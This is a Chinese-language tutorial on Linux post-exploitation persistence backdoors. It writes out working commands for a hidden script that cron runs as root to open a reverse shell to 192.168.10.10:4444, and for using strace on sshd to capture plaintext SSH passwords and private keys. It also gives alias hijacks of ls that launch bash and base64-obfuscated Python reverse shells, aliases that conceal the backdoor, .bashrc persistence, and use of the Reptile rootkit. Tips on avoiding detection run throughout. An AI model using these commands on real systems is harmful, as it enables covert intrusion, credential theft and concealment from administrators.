

## **定时任务cron反弹后门**

cron后门，主要就是利用系统的定时任务功能实现反弹shell。

编辑后门反弹
这里创建一个.隐藏文件，然后在隐藏文件中添加反弹shell的地址及端口，在给脚本添加一个执行权限。
```
vim /etc/.backshell.sh

#!/bin/bash
bash -i >& /dev/tcp/192.168.10.10/4444 0>&1

chmod +x /etc/.backshell.sh
```

添加定时任务
设定每分钟自动执行该脚本。
```
vim /etc/crontab
*/1 * * * * root /etc/.backshell.sh
```
查看反弹
在攻击机上监听本地的4444端口，来等待反弹shell执行。
```
nc -lvvp 4444
```
查看流量
可以去目标主机上查看一下端口连接情况，可以看到是存在4444端口的连接的。
```
netstat -ant
```
^
## **监控密码strace后门**
strace是个功能强大的Linux调试分析诊断工具，可用于跟踪程序执行时进程系统调用(system  call)和所接收的信号，尤其是针对源码不可读或源码无法再编译的程序。

在Linux系统中，用户进程不能直接访问计算机硬件设备。当进程需要访问硬件设备(如读取磁盘文件或接收网络数据等)时，必须由用户态模式切换至内核态模式，通过系统调用访问硬件设备。strace可跟踪进程产生的系统调用，包括参数、返回值和执行所消耗的时间。若strace没有任何输出，并不代表此时进程发生阻塞；也可能程序进程正在执行某些不需要与系统其它部分发生通信的事情。strace从内核接收信息，且无需以任何特殊方式来构建内核。

而且strace可以当作一个键盘记录的后门。

#### 监控记录sshd明文密码
这里首先记录密码，等待用户下次使用ssh进行连接，连接后就会在你设置的这个目录中存储明文密码。
```
(strace -f -F -p `ps aux|grep "sshd -D"|grep -v grep|awk {'print $2'}` -t -e trace=read,write -s 32 2> /tmp/.sshd.log &)  
记录ssh登录密码存储到/tmp/.sshd.log文件中。

grep -E 'read\(6, ".+\\0\\0\\0\\.+"' /tmp/.sshd.log  
查看这个文件。
```
这里使用筛选来查找就是为了更加的方面查找到密码，否则可以去看看，该文件中登录一次的内容都很多，靠肉眼很难查找到。

#### 记录sshd私钥
```
(strace -f -F -p ps aux|grep "sshd -D"|grep -v grep|awk {'print $2'} -t -e trace=read,write -s 4096 2> /tmp/.sshd.log &)  
这里也是同样的记录私钥到该文件中。

grep ‘PRIVATE KEY’ /tmp/.sshd.log  
读取私钥。
```

缺点：
这个命令文件存在一个很大的问题就是，会一直记录登陆的字节流，可以去查看一下文件，这个文件会越来越大，所以如果真实环境下，还是少用该方式吧，避免由于文件占用过大，导致硬盘报警，从而被发现。
ls -al /tmp/.sshd.log


^
## **后门命令重命名Alias后门**
alias在Linux中主要是用于设置命令的别名，比如当你设置ls等于ls -al的时候就可以使用alias来实现。
PS：该手法在重启后就不再生效了。

基础使用：
```
alias ls='ls -al'  ##设置别名
ls
unalias ls   ##删除别名
```

后门使用：
将ls设置为反弹shell
```
alias ls='alerts(){ ls $* --color=auto;bash -i >& /dev/tcp/192.168.10.10/4444 0>&1; };alerts'

nc -lvvp 4444
```
这里执行ls后会成功执行命令，但是存在一个很大的问题就是ls命令会卡死，无法操作，只有攻击者将会话结束，才能够恢复。

反弹python的shell
这里其实就是调用python的模块来执行，利用socket反弹一个shell，同时这里是使用bash64进行加密了，届时修改的时候，可以将该密文中的IP地址及端口修改为自己的即可。
```
alias ls='alerts(){ ls $* --color=auto;python3 -c "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'\''UTF-8'\'')}[sys.version_info[0]]('\''aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgcmV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiMTkyLjE2OC4xMC4xMCIsIDQ0NDQpKQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMCkKICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDEpCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAyKQogICAgICAgIHAgPSBzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwgIi1pIl0pCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgZXhpdCgp=='\'' "sys.version_info[0]")))";};alerts'
```




#### 持久化
这里就是保证系统在重启后依旧能够生效。

修改文件嵌入命令
```
vim /etc/upload  #将下面的三个后门命令写入

alias ls='alerts(){ ls $* --color=auto;python -c "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'\''UTF-8'\'')}[sys.version_info[0]]('\''aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgcmV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiMTkyLjE2OC4xMC4xMCIsIDQ0NDQpKQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMCkKICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDEpCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAyKQogICAgICAgIHAgPSBzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwgIi1pIl0pCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgZXhpdCgp=='\'' "sys.version_info[0]")))";};alerts'

alias unalias='alerts(){ if [ $# != 0 ]; then if [ $* != "ls" ]&&[ $* != "alias" ]&&[ $* != "unalias" ]; then unalias $*;else echo "-bash: unalias: ${*}: not found";fi;else echo "unalias: usage: unalias [-a] name [name ...]";fi;};alerts'

alias alias='alerts(){ alias "$@" | grep -v unalias | sed "s/alerts.*lambda.*/ls --color=auto'\''/";};alerts'
```


.bashrc是用户级的bash配置文件，每个使用bash shell的用户登录时都会加载这个文件。
```
vim ~/.bashrc
在最后面写入
if [ -f /etc/upload ]; then
 . /etc/upload
fi

这段命令检查/etc/upload文件是否存在，如果存在，就执行该文件中的命令。这会导致上面设置的后门别名在用户的shell会话中生效。
```


^
## **内核加载LKM-Rootkit后门**
内核级后门，Rootkit 可能提供多种功能，如：
* 隐藏进程、文件和网络连接。
* 提供后门访问。
* 记录按键和监控用户活动。

正常情况下Linux的后门多数都是使用msf来建立连接，但是这些连接都会被运维人员发现，所以我们想有一个非tcp连接、流量不容易被怀疑的后门，并且在大量的shell的场景下，可以管shell，Reptile刚好是种LKM rootkit，因此具有很好的隐藏性和强大的功能。
Reptile安装到目标机，通过命令实现各种隐藏功能。



隐藏进程：
隐藏后门连接：
隐藏文件：
文件名中带reptile的都会被隐藏
```
mkdir reptile_file
ls -l     无显示
cd reptile_file 有
```
^
关于Rootkit的查杀非100%：
linux平台下：Gscan、chkrootkit、rkhunter、OSSEC、zeppoo
Windows平台下:BlackLight、RootkitRevealer、Rootkit Hook Analyzer